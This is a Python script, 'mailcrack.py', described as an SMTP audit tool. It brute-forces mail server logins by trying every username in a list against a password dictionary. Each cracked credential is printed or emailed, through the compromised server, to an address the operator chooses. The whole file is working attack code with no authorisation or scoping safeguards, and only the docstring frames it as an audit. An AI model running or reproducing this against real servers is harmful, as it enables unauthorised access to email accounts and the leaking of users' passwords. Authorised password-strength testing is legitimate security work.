#!/usr/bin/env python3

__author__ = "Wayne Simmerson"
__email__ = "wsimmerson@gmail.com"

"""
    mailcrack.py
    
    Security Audit tool for SMTP servers which require authentication to send.
    Searches for Weak Passwords by attempting to brute force a list of usernames
    against a list of common passwords
    
"""

import smtplib
import argparse
import os, sys, time

def mailcrack(userlist, dictionary, servername, output, delay):
    """
        Attempt to Brute Force SMTP
    """
    # Load Data from Files
    if os.path.isfile(userlist):
        try:
            with open(userlist) as file:
                users = file.readlines()
        except Exception as e:
            print('There was a problem opening %s!\n%s' % (userlist, str(e)))
            sys.exit(1)
            
    if os.path.isfile(dictionary):
        try:
            with open(dictionary) as file:
                words = file.readlines()
        except Exception as e:
            print('There was a problem opening %s!\n%s' % (dictionary, str(e)))
            sys.exit(1)
                
            
    for user in users:
        user = user.rstrip()
        for word in words:
            word = word.rstrip()
            
            server = smtplib.SMTP(servername)
            
            success = True
            time.sleep(delay)
            
            try:
                server.login(user, word)
            except smtplib.SMTPAuthenticationError:
                success = False
                
            if success:
                message = '%s is using a password of %s' % (user, word)
                if output.lower() == 'stdout':
                    print(message)
                else:
                    try:
                        header = "From: %s\r\nTo: %s\r\nSubject: Password Cracked\r\n\r\n" % (output, output)
                        server.sendmail(output, output, header + message)
                    except Exception as e:
                        print("Could not send email! An Exception occured\n%s" % str(e))
                                            
            server.quit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--users', required=True,
                        help="<filename> with a list of user names")
    parser.add_argument('-d', '--dict', required=True,
                        help="<filename> with a list of passwords to attempt")
    parser.add_argument('-s', '--server', required=True,
                        help='SMTP Server URL')
    parser.add_argument('-o', '--output', default='stdout',
                        help="print email to stdout or <emailaddress>")
    parser.add_argument('-p', '--pause', default=20, type=int,
                        help="seconds delay time between send attempts. default 20 seconds")
    
    args = parser.parse_args()
    
    mailcrack(args.users, args.dict, args.server, args.output, args.pause)
    